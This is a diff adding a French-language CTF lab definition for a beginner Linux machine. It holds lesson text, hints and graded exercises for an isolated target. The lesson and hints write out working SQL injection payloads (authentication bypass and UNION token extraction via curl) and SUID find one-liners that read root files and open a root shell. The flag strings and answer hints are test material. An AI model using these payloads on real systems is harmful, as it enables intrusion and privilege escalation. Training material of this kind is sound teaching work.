@@ -1,0 +1,102 @@
+title: Buanderie
+track: offensif
+machine_os: linux
+level: debutant
+order: 6
+tags: [machine, web, injection sql, sqli, union, rce, élévation de privilèges, suid, gtfobins, linux, cve]
+summary: Machine Facile Linux - un formulaire de connexion vulnérable à l'injection SQL (contournement + UNION) livre un jeton d'admin et l'accès à un outil qui exécute des commandes, puis un binaire SUID (find) mal configuré mène à root. Capture le drapeau utilisateur puis le drapeau root.
+compose: docker-compose.yml
+service: attaquant
+shell: bash
+flags:
+  user: "TDM{bu4nd3r1e_un10n_sql_1nj3ct10n}"
+  root: "TDM{bu4nd3r1e_su1d_f1nd_r00t}"
+description: |
+  **Machine : Buanderie · Facile · 🐧 Linux**
+
+  La cible héberge « Buanderie Pro » et son espace de connexion. Comme sur une machine Hack The Box,
+  teste les entrées du formulaire : si la requête SQL se laisse manipuler, tu peux contourner
+  l'authentification **et extraire des données**. Objectif : drapeau **utilisateur** (`user.txt`) puis
+  élévation vers le drapeau **root** (`root.txt`).
+
+  La **cible** est isolée sur le réseau interne du lab : elle ne peut rien atteindre à l'extérieur. **Réinitialiser** reconstruit une cible neuve.
+
+  **Pistes.**
+
+  1. Reconnaissance : `curl http://cible/` - repère le formulaire `/connexion` (`nom`, `motdepasse`).
+  2. Teste une **injection SQL** : un `'` casse-t-il la requête ? Contourne l'authentification
+     (`nom=admin'-- `), puis extrais le **jeton d'administration** par une requête **UNION**.
+  3. Avec le jeton, l'outil `/outil?jeton=...&cmd=...` exécute des commandes : tu agis en tant que
+     `linge`. Lis `user.txt`.
+  4. Cherche les binaires **SUID** (`find / -perm -4000 2>/dev/null`). L'un d'eux (voir *GTFOBins*)
+     permet de lire un fichier en root : c'est ton chemin vers `root.txt`.
+
+  Outils : `curl`, `nmap`, `python3`.
+cours: |
+  ## Injection SQL et élévation par binaire SUID
+
+  ### Injection SQL (SQLi)
+
+  Quand une application insère une entrée utilisateur dans une requête SQL **par concaténation**,
+  l'attaquant modifie la requête. Deux usages classiques :
+
+  - **Contournement d'authentification** : `nom = admin'-- ` transforme
+    `... WHERE nom='admin'-- ' AND motdepasse='...'` ; le `--` commente la suite, le mot de passe n'est
+    plus vérifié.
+  - **Extraction par UNION** : `nom = zzz' UNION SELECT jeton FROM comptes-- ` ajoute une seconde requête
+    dont le résultat s'affiche à la place du nom - ici le **jeton d'administration**.
+
+  C'est l'une des failles web les plus anciennes et les plus critiques. CVE marquantes de cette famille :
+  **CVE-2012-2122** (contournement d'auth MySQL), **CVE-2017-8917** (SQLi Joomla), **CVE-2019-9193**.
+
+  ```
+  curl -s -G http://cible/connexion --data-urlencode "nom=zzz' UNION SELECT jeton FROM comptes-- " --data-urlencode "motdepasse=x"
+  curl -s -G http://cible/outil --data-urlencode "jeton=<JETON>" --data-urlencode "cmd=id"
+  ```
+
+  ### Élévation de privilèges par binaire SUID (GTFOBins)
+
+  Un binaire avec le bit **SUID** s'exécute avec les droits de son **propriétaire** (ici root), quel que
+  soit l'utilisateur qui le lance. On les repère avec `find / -perm -4000 2>/dev/null`. Si l'un d'eux
+  figure sur *GTFOBins*, on l'exploite. Exemple avec `find` SUID :
+
+  ```
+  find /etc/hostname -exec cat /root/root.txt \;   # cat s'exécute en root -> lit root.txt
+  find . -exec /bin/sh -p \; -quit                 # shell root complet
+  ```
+
+  ### Côté défense
+
+  Pour la SQLi : requêtes **paramétrées** (jamais de concaténation), moindre privilège sur le compte SQL.
+  Pour le SUID : ne jamais poser le bit SUID sur un binaire capable d'exécuter des commandes arbitraires ;
+  auditer régulièrement (`find / -perm -4000`).
+docs:
+  - title: OWASP - SQL Injection
+    url: https://owasp.org/www-community/attacks/SQL_Injection
+  - title: GTFOBins - find (SUID)
+    url: https://gtfobins.github.io/gtfobins/find/#suid
+exercises:
+  - id: reconnaissance
+    title: Repérer le formulaire
+    description: |
+      Récupère la page d'accueil et repère le formulaire de connexion. Enregistre la page dans
+      `/root/reponses/accueil.html`.
+    hint: "curl -s http://cible/ | tee /root/reponses/accueil.html"
+    cours: |
+      Identifier les paramètres `nom` et `motdepasse` et l'endpoint `/connexion` est le point de départ :
+      ce sont eux que tu vas tester pour l'injection SQL.
+    checks:
+      - desc: La page de la cible a été récupérée
+        run: grep -qi 'Buanderie' /root/reponses/accueil.html
+  - id: sqli
+    title: Injection SQL et extraction du jeton
+    description: |
+      Par une injection **UNION**, extrais le jeton d'administration et enregistre la réponse (qui doit
+      contenir un jeton `ADM-...`) dans `/root/reponses/sqli.txt`.
+    hint: "curl -s -G http://cible/connexion --data-urlencode \"nom=zzz' UNION SELECT jeton FROM comptes-- \" --data-urlencode 'motdepasse=x' | tee /root/reponses/sqli.txt"
+    cours: |
+      Récupérer le jeton d'admin par UNION prouve que tu peux lire des données arbitraires de la base.
+      Ce jeton te donne accès à l'outil de maintenance, donc à l'exécution de commandes (RCE).
+    checks:
+      - desc: Le jeton d'administration a été extrait par injection SQL
+        run: grep -q 'ADM-' /root/reponses/sqli.txt
